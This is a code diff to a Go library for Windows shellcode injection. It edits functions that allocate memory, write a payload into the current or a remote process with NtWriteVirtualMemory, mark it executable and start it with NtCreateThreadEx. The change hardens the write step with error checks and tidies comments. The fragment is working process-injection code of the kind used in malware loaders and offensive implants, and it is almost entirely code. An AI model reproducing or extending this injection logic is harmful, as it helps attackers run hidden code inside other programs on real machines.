@@ -1011,8 +1011,22 @@ func NtInjectSelfShellcode(payload []byte) error {
 		return fmt.Errorf("memory allocation failed: %v %s", err, FormatNTStatus(status))
 	}
 
-	// Step 2: Copy shellcode
-	copy((*[1 << 30]byte)(unsafe.Pointer(baseAddress))[:len(payload)], payload)
+	// Step 2: Write shellcode using NtWriteVirtualMemory (safer than unsafe copy)
+	var bytesWritten uintptr
+	status, err = NtWriteVirtualMemory(
+		currentProcess,
+		baseAddress,
+		unsafe.Pointer(&payload[0]),
+		uintptr(len(payload)),
+		&bytesWritten,
+	)
+	if err != nil || status != STATUS_SUCCESS {
+		return fmt.Errorf("write failed: %v %s", err, FormatNTStatus(status))
+	}
+	if bytesWritten != uintptr(len(payload)) {
+		return fmt.Errorf("incomplete write: %d bytes written, expected %d", bytesWritten, len(payload))
+	}
+	debug.Printfln("WINAPI", "Wrote %d bytes to self process\n", bytesWritten)
 
 	// Step 3: Change protection to RX
 	var oldProtect uintptr
@@ -1177,7 +1191,7 @@ func NtInjectRemote(processHandle uintptr, payload []byte) error {
 	
 	debug.Printfln("WINAPI", "Changed memory protection to RX\n")
 
-	// Step 4: Create remote thread using NtCreateThreadEx (fire and forget approach like working example)
+	// Step 4: Create remote thread using NtCreateThreadEx 
 	var hThread uintptr
 	
 	status, err = NtCreateThreadEx(
@@ -1210,7 +1224,7 @@ func NtInjectRemote(processHandle uintptr, payload []byte) error {
 	
 	debug.Printfln("WINAPI", "Created remote thread: 0x%X\n", hThread)
 
-	// Step 5: Close thread handle immediately (fire and forget like working example)
+	// Step 5: Close thread handle immediately 
 	closeStatus, err := NtClose(hThread)
 	if err != nil || closeStatus != STATUS_SUCCESS {
 		debug.Printfln("WINAPI", "Warning: Failed to close thread handle: %v %s\n", err, FormatNTStatus(closeStatus))
